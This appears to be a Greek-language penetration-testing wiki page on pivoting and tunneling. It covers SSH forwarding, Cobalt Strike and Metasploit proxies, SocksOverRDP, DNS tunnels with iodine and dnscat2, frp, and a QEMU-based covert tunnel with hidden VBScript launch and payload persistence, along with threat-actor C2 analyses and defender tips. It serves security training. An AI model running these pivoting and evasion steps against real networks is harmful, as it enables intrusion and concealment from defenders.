...
> [!WARNING]
> Η υποστήριξη proxy του Nmap περιορίζεται σε συνδέσεις TCP και δεν επηρεάζει τις σαρώσεις ping, θυρών ή ανίχνευσης OS. Όταν ο scanner βρίσκεται πίσω από SOCKS proxy, **απενεργοποιήστε την ανίχνευση host** (`-Pn`) και χρησιμοποιήστε **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>
...
Το `-Y` ενεργοποιεί την αξιόπιστη προώθηση X11 και το `-C` ζητά συμπίεση για τα δεδομένα που προωθούνται.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Άνοιγμα νέου Port στον SSH Server --> Άλλο port

Η προώθηση Remote (`-R`) ακούει στον SSH server και συνδέεται με την τοπική πλευρά· η ρητά καθορισμένη bind address ελέγχει ποιες διεπαφές μπορούν να έχουν πρόσβαση σε αυτόν τον listener.<sup>[[6]](#references)</sup>
```bash
...
Η προώθηση Local (`-L`) ακούει στον client και συνδέεται με τον προορισμό από την πλευρά του SSH server.<sup>[[6]](#references)</sup>
```bash
...
Η δυναμική προώθηση (`-D`) δημιουργεί έναν τοπικό listener SOCKS4/SOCKS5, οι συνδέσεις του οποίου ανοίγουν από την απομακρυσμένη πλευρά.<sup>[[6]](#references)</sup>
```bash
...
> Το OpenSSH 9.6 πρόσθεσε μια επέκταση strict-KEX για την αντιμετώπιση της επίθεσης ακεραιότητας early-transport του Terrapin. Ενημερώστε και τα δύο peers όπου είναι δυνατό και ακολουθήστε τις οδηγίες του vendor για παλαιότερες υλοποιήσεις, αντί να θεωρείτε ότι ένα forwarded channel προστατεύεται μόνο από την έκδοση.<sup>[[8]](#references)</sup>

## SSHUTTLE

Μπορείτε να κάνετε **tunnel** μέσω **ssh** όλη την **traffic** προς ένα **subnetwork** μέσω ενός host.\
Για παράδειγμα, να κάνετε forward όλη την traffic που κατευθύνεται στο 10.10.10.0/24
...
Το `portfwd` του Metasploit υποστηρίζει local και remote forwarding, ενώ το SOCKS proxy module προορίζεται να λειτουργεί με session routes ή `autoroute` και, σε αυτά τα παραδείγματα, ακούει από προεπιλογή στη θύρα 1080.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Τοπική θύρα --> Παραβιασμένος host (active session) --> Third_box:Port
```bash
...
Το Beacon του Cobalt Strike μπορεί να μεταφέρει συνδέσεις SOCKS4a/SOCKS5 μέσω ενός Beacon· το `rportfwd` κάνει bind στον compromised host, ενώ το `rportfwd_local` ξεκινά τη σύνδεση προς τον προορισμό από τον Cobalt Strike client.<sup>[[13]](#references)[[14]](#references)</sup>
...
> [!WARNING]
> Σε αυτήν την περίπτωση, η **θύρα ανοίγει στον Beacon host**, όχι στον Team Server, και η κίνηση αποστέλλεται στον Team Server και από εκεί στον υποδεικνυόμενο host:port.<sup>[[14]](#references)</sup>
```bash
...
- Το reverse port forward του Beacon έχει σχεδιαστεί για **tunnel της κίνησης προς το Team Server και όχι για relay μεταξύ μεμονωμένων μηχανημάτων**.
...
> [!WARNING]
> Σε αυτήν την περίπτωση, η **θύρα ανοίγει στο Beacon host**, όχι στο Team Server, και η **κίνηση αποστέλλεται στο Cobalt Strike client** (όχι στο Team Server) και από εκεί στο υποδεικνυόμενο host:port.<sup>[[14]](#references)</sup>
```bash
...
Το project παρέχει web tunnel endpoints όπως `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` και `tunnel.php`· ανεβάστε ένα υποστηριζόμενο endpoint πριν ξεκινήσετε το local proxy.<sup>[[15]](#references)</sup>
```bash
...
Το quickstart του Ligolo-ng τεκμηριώνει ένα TUN interface στο proxy, validation του certificate fingerprint για το agent και ρύθμιση routes για το tunneled network.<sup>[[17]](#references)</sup>
...
interface_list
```
### Σύνδεση και ακρόαση του Agent

Το Ligolo-ng μπορεί να προσθέσει listeners στον agent, οι οποίοι προωθούν την κίνηση σε μια διεύθυνση στην πλευρά του proxy, ενώ το δεσμευμένο εύρος `240.0.0.0/4` μπορεί να δρομολογηθεί ώστε να είναι προσβάσιμες υπηρεσίες τοπικές στον agent.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
...
Το Rpivot ξεκινά το reverse tunnel από το victim και εκθέτει ένα SOCKS4 proxy στη loopback address του attacker· το README του τεκμηριώνει επίσης credentials για NTLM-proxy και επιλογές hash.<sup>[[20]](#references)</sup>
```bash
...
```
Μπορείτε να διασχίσετε ένα **non-authenticated proxy** με τον τεκμηριωμένο τύπο διεύθυνσης `PROXY` του socat, εκτελώντας αυτήν τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος.<sup>[[21]](#references)</sup>
```bash
...
Το Plink είναι το εργαλείο συνδέσεων γραμμής εντολών του PuTTY, με επιλογές SSH forwarding παρόμοιες με το `ssh`.<sup>[[22]](#references)</sup>

Χρησιμοποιήστε κεφαλαίο `-P` για τη θύρα SSH. Το `-pw` διατηρείται για συμβατότητα, αλλά εκθέτει τον κωδικό πρόσβασης στη λίστα διεργασιών· προτιμήστε authentication με κλειδί ή το `-pwfile`, όπου είναι δυνατό.<sup>[[22]](#references)[[23]](#references)</sup>

Καθώς αυτό το binary θα εκτελεστεί στο victim και είναι SSH client, ανοίξτε την υπηρεσία και τη θύρα SSH για τη reverse connection· το παρακάτω χρησιμοποιεί το `-R` για να προωθήσει μια τοπικά προσβάσιμη θύρα στο μηχάνημα του attacker.<sup>[[22]](#references)</sup>
```bash
...
Χρησιμοποιήστε ένα context με τα απαιτούμενα δικαιώματα από το host κατά τη δημιουργία ή την αλλαγή persistent κανόνων `portproxy`. Η Microsoft τεκμηριώνει τις μορφές add, show και delete του `v4tov4` που χρησιμοποιούνται παρακάτω.<sup>[[24]](#references)</sup>
```bash
...
Το SocksOverRDP χρησιμοποιεί Remote Desktop Dynamic Virtual Channels για να μεταφέρει μια σύνδεση SOCKS5 μέσω μιας υπάρχουσας RDP session· το client plugin ακούει στη διεύθυνση `127.0.0.1:1080`, ενώ το server component εκτελείται στον RDP target.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το tool χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από το Remote Desktop Service feature των Windows. Το DVC είναι υπεύθυνο για το **tunneling πακέτων μέσω της RDP connection**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Στον client computer σας φορτώστε το **`SocksOverRDP-Plugin.dll`** ως εξής:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Τώρα μπορούμε να **συνδεθούμε** στο **victim** μέσω **RDP** χρησιμοποιώντας το **`mstsc.exe`**, και θα πρέπει να λάβουμε ένα **prompt** που θα αναφέρει ότι το **SocksOverRDP plugin είναι ενεργοποιημένο** και θα **ακούει** στη διεύθυνση **127.0.0.1:1080**.

**Συνδεθείτε** μέσω **RDP** και ανεβάστε και εκτελέστε στο victim machine το binary `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Τώρα, επιβεβαιώστε στο μηχάνημα (attacker) ότι η θύρα 1080 βρίσκεται σε κατάσταση ακρόασης:
```
netstat -antb | findstr 1080
```
Τώρα μπορείς να χρησιμοποιήσεις το [**Proxifier**](https://www.proxifier.com/) για να δρομολογήσεις την κίνηση μέσω αυτής της θύρας.<sup>[[26]](#references)</sup>

## Proxify εφαρμογές GUI των Windows

Μπορείς να κάνεις τις εφαρμογές GUI των Windows να περιηγούνται μέσω ενός proxy χρησιμοποιώντας το [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Στο **Profile -> Proxy Servers** πρόσθεσε την IP και τη θύρα του SOCKS server.\
Στο **Profile -> Proxification Rules** πρόσθεσε το όνομα του προγράμματος που θέλεις να κάνεις proxify και τις συνδέσεις προς τις IPs που θέλεις να κάνεις proxify· οι κανόνες του Proxifier μπορούν να ταιριάζουν με εφαρμογές, hosts προορισμού και θύρες.<sup>[[27]](#references)</sup>

## Tunnel μέσω ενός NTLM proxy

Το εργαλείο που αναφέρθηκε προηγουμένως, το **Rpivot**, μπορεί να κάνει relay μέσω ενός proxy που απαιτεί NTLM authentication. Το **OpenVPN** μπορεί επίσης να δρομολογηθεί μέσω ενός τέτοιου proxy όταν ρυθμιστεί με ένα auth file και τη μέθοδο NTLMv2· αυτό είναι proxy traversal και όχι bypass του proxy authentication.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
...
Το Cntlm πραγματοποιεί authentication σε upstream NTLM proxies, εκθέτει local listeners και μπορεί να αντιστοιχίσει μια local tunnel port σε μια destination service· στη συνέχεια, οι clients μπορούν να χρησιμοποιήσουν αυτήν τη local port.<sup>[[29]](#references)</sup>\
...
Το Iodine δημιουργεί ένα IPv4 tunnel μέσω DNS queries και χρησιμοποιεί TUN interfaces· η τεκμηριωμένη ρύθμιση απαιτεί τα privileges που χρειάζονται για τη δημιουργία αυτών των interfaces και στα δύο άκρα.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Η μεταφορά μέσω DNS έχει μεγαλύτερο overhead από το άμεσο TCP και είναι συνήθως αργή· μπορείτε να δημιουργήσετε μια συμπιεσμένη σύνδεση SSH μέσω αυτού του tunnel χρησιμοποιώντας:<sup>[[31]](#references)</sup>
```
...
Η διαδραστική εντολή `listen` του Dnscat2 αντιστοιχίζει έναν local listener σε έναν απομακρυσμένο host και port.<sup>[[32]](#references)</sup>
```bash
...
Το Proxychains-ng συνδέεται δυναμικά σε TCP connections και δεν μπορεί να μεταφέρει UDP ή ICMP. Το DNS proxying είναι παραμετροποιήσιμο, επομένως ελέγξτε το εγκατεστημένο `proxychains.conf` και το resolver helper αντί να υποθέτετε έναν σταθερό public resolver. Τα legacy `proxyresolv` scripts παρέχουν το `PROXY_DNS_SERVER` για την επιλογή του resolver. Χρησιμοποιήστε έναν resolver που είναι προσβάσιμος από το pivot όταν απαιτούνται internal names.<sup>[[34]](#references)[[35]](#references)</sup>
...
Ο actor Storm-2603 δημιούργησε ένα **dual-channel C2 ("AK47C2")** που κάνει abuse *μόνο* εξερχόμενης κίνησης **DNS** και **plain HTTP POST** – δύο protocols που σπάνια αποκλείονται σε corporate networks.<sup>[[2]](#references)</sup>
...
• Κάθε πεδίο είναι **XOR-encrypted με το ASCII key `VHBD@H`**, γίνεται hex-encoded και συνδέεται με τελείες – καταλήγοντας τελικά στο attacker-controlled domain:
...
• Όταν η απόκριση ξεπερνά τα 0xFF bytes, το backdoor κάνει **fragments** τα δεδομένα σε κομμάτια των 63 bytes και εισάγει τα markers:
...
• Η απάντηση ακολουθεί το ίδιο encoding και το πεδίο `cmd` εκτελείται με `cmd.exe /c <command> 2>&1`.
...
• Ένα constant XOR key ακολουθούμενο από ASCII-hex ανιχνεύεται εύκολα με YARA: `6?56484244?484` (`VHBD@H` σε hex).
...
{{#note}}
Το channel διατηρεί κάθε sub-domain label εντός του ορίου των 63 octets του DNS, όμως η συμμόρφωση με το protocol από μόνη της δεν το καθιστά stealthy. Τα σπάνια domains, τα long hexadecimal labels και ο όγκος των queries παραμένουν detection signals.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}
...
Το ptunnel-ng μεταφέρει συνδέσεις TCP μέσω ICMP και χρησιμοποιεί τις επιλογές `-p`, `-l`, `-r` και `-R` που εμφανίζονται παρακάτω για το proxy, τον τοπικό listener, τον host προορισμού και τη θύρα προορισμού αντίστοιχα.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh
...
Το [**ngrok**](https://ngrok.com/) είναι ένας agent για τη δημοσίευση τοπικών network services online μέσω ενός ασφαλούς tunnel· το CLI τεκμηριώνει HTTP, TCP και file URL endpoints, ενώ το hostname του endpoint που εμφανίζεται μπορεί να διαφέρει ανάλογα με το endpoint και τον λογαριασμό.<sup>[[39]](#references)</sup>
...
Ο standalone agent εκθέτει από προεπιλογή το HTTP inspection interface στη διεύθυνση `http://127.0.0.1:4040`· το interface προορίζεται για HTTP traffic.<sup>[[40]](#references)</sup>
...
```
Ο connector δημιουργεί εξερχόμενες συνδέσεις και, από προεπιλογή, πραγματοποιεί διαπραγμάτευση QUIC με εναλλακτική επιλογή HTTP/2· μην υποθέτετε ότι κάθε deployment χρησιμοποιεί TCP/443. Εκτελέστε το μόνο με τα απαιτούμενα δικαιώματα για το deployment σας.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

Το [`frp`](https://github.com/fatedier/frp) είναι ένα reverse proxy γραμμένο σε Go που υποστηρίζει **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX και XTCP**. Το XTCP χρησιμοποιεί P2P hole punching, του οποίου η επιτυχία εξαρτάται από το NAT. Από την έκδοση **v0.53.0** μπορεί να λειτουργεί ως **SSH Tunnel Gateway**, επιτρέποντας σε ένα target host να χρησιμοποιεί τον stock OpenSSH client χωρίς binary `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>
...
remotePort = 5000
```
### Χρήση της νέας πύλης SSH (χωρίς δυαδικό frpc)
```bash
# On frps (attacker)
...
Το QEMU user-mode networking δεν απαιτεί δικαιώματα root ή administrator για το virtual network, και το `-netdev user,hostfwd=...` ανακατευθύνει συνδέσεις TCP, UDP ή UNIX από το host στο guest.<sup>[[51]](#references)</sup> Η TrustedSec τεκμηρίωσε ένα Tiny Core QEMU VM και μια απόπειρα reverse SSH tunnel σε ένα περιστατικό όπου το host-focused EDR θα μπορούσε να παραλείψει δραστηριότητα μέσα στο guest.<sup>[[1]](#references)</sup>
...
• Από την οπτική γωνία του attacker, ο στόχος εκθέτει απλώς τη θύρα 2222· τυχόν πακέτα που φτάνουν σε αυτήν διαχειρίζονται από τον SSH server που εκτελείται στο VM.

### Κρυφή εκκίνηση μέσω VBScript

Η TrustedSec παρατήρησε εκκινήσεις του QEMU μέσω VBS και images του Tiny Core στο περιστατικό που αναφέρεται παραπάνω.<sup>[[1]](#references)</sup>
```vb
...
1. Αποθέστε το payload στο `/opt/123.out`
2. Προσθέστε στο `/opt/bootlocal.sh`:
...
3. Προσθέστε τα `home/tc` και `opt` στο `/opt/filetool.lst`, ώστε το payload να συσκευάζεται στο `mydata.tgz` κατά τον τερματισμό λειτουργίας.

### Ζητήματα telemetry

• Ο host εξακολουθεί να εκθέτει τη διεργασία QEMU, το qcow2 image και οποιονδήποτε listener που έχει προωθηθεί από τον host.
• Οι σαρώσεις διεργασιών που εκτελούνται μόνο στον host ενδέχεται να μην ελέγχουν τις διεργασίες του guest, όμως το virtualization δεν εγγυάται evasion· τα network, QEMU και image telemetry μπορούν ακόμη να το αποκαλύψουν.<sup>[[1]](#references)[[51]](#references)</sup>

### Συμβουλές για defenders

• Δημιουργήστε alert για **μη αναμενόμενα QEMU/VirtualBox/KVM binaries** σε paths με δυνατότητα εγγραφής από χρήστες.
...
Η ίδια αναφορά περιγράφει τα defaults, τους wildcard listeners, την αποκρυπτογράφηση πακέτων, τα relay queues και το debug telemetry που συνοψίζονται παρακάτω.<sup>[[3]](#references)</sup>
...
* **Wildcard interception** – οι operators παρέχουν μια λίστα URL prefixes χωρισμένων με ερωτηματικό (wildcards σε host + path). Το module καλεί το `HttpAddUrl` για κάθε καταχώριση, οπότε το HTTP.sys δρομολογεί τα requests που ταιριάζουν στον malicious handler· τα requests που δεν ταιριάζουν επιστρέφουν στην κανονική συμπεριφορά του IIS.
...
* **Relay orchestration** – το module διατηρεί δύο λίστες: “servers” (upstream nodes) και “clients” (downstream implants). Οι καταχωρίσεις διαγράφονται αν δεν ληφθεί heartbeat εντός περίπου 30 δευτερολέπτων. Όταν και οι δύο λίστες δεν είναι κενές, συνδέει τον πρώτο healthy server με τον πρώτο healthy client και απλώς προωθεί bytes μεταξύ των sockets τους μέχρι να κλείσει η μία πλευρά.
* **Debug telemetry** – το προαιρετικό logging καταγράφει τη source IP, τη destination IP και τα συνολικά forwarded bytes για κάθε pairing. Οι investigators χρησιμοποίησαν αυτά τα breadcrumbs για να ανακατασκευάσουν το ShadowPad mesh που εκτεινόταν σε πολλαπλά victims.
...
- [46] [Αρχείο διαμόρφωσης Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
